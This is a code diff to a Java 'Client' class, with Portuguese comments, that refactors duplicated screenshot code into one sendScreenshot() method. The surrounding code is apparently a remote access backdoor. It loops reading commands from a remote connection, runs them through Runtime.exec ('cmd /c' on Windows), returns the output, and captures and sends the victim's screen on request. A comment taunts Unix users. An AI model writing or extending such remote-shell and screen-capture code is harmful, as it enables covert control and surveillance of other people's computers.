@@ -44,7 +44,7 @@ public class Client {
             String command = connection.readMessage().getCommand();
 
             if (Objects.equals(command, "screen")) { // neguin pediu screenshot
-                takeScreenshot();
+                sendScreenshot();
             } else {
                 Process process = Runtime.getRuntime().exec("cmd /c" + command);
                 Scanner respostaDoComando = new Scanner(process.getInputStream());
@@ -59,36 +59,13 @@ public class Client {
         }
     }
 
-    private static void takeScreenshot() throws AWTException, IOException {
-        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
-
-        Robot robot = new Robot();
-
-        BufferedImage screenShot = robot.createScreenCapture(screenRect);
-        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-
-        ImageIO.write(screenShot, "jpg", byteArrayOutputStream);
-        byteArrayOutputStream.flush();
-
-        connection.sendMessage(new Message("screen", byteArrayOutputStream.toByteArray()));
-    }
-
     static void unixHandler() throws Exception {
         System.out.println("Hm safadinho ta usando uns uniks heim kk q developer vc");
         while (true) {
             String command = connection.readMessage().getCommand();
 
             if (Objects.equals(command, "screen")) { // neguin pediu screenshot
-                Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
-                BufferedImage screenshot = new Robot().createScreenCapture(screenRect);
-
-                ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                ImageIO.write( screenshot, "jpg", baos );
-                baos.flush();
-                byte[] imageBytes = baos.toByteArray();
-                baos.close();
-
-                connection.sendMessage(new Message("screen", imageBytes));
+                sendScreenshot();
             } else {
                 Process proc = Runtime.getRuntime().exec(command);
                 Scanner respostaDoComando = new Scanner(proc.getInputStream());
@@ -103,4 +80,16 @@ public class Client {
         }
     }
 
+    private static void sendScreenshot() throws AWTException, IOException {
+        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+        BufferedImage screenshot = new Robot().createScreenCapture(screenRect);
+
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ImageIO.write( screenshot, "jpg", baos );
+        baos.flush();
+        byte[] imageBytes = baos.toByteArray();
+        baos.close();
+
+        connection.sendMessage(new Message("screen", imageBytes));
+    }
 }
